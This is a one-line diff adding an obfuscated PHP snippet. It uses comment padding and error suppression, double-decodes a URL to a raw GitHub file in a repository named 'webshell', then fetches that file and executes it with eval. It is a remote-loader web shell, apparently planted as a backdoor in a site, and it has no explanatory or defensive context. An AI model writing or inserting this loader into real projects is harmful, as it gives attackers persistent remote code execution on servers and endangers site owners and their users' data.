@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(rawurldecode("https%253A%252F%252Fraw.githubusercontent.com%252Fjustikail%252Fwebshell%252Fmain%252Fc0m.php"))));/**/?>
